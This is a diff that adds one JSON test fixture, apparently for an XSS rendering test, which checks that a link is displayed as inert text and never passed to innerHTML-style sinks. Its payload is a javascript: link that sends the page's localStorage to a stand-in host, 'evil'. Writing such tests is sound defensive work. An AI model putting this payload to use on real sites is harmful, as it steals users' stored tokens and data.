@@ -1,0 +1,11 @@
+{
+  "id": "render-xss-js-url-003",
+  "category": "render",
+  "vector": "javascript_url_href",
+  "payload": "Tap this link <a href=\"javascript:fetch('http://evil/'+localStorage)\">to continue</a>",
+  "expectation": {
+    "render_contract": "text_content_only",
+    "inert_as_text": true,
+    "forbidden_html_sinks": ["innerHTML", "outerHTML", "insertAdjacentHTML"]
+  }
+}
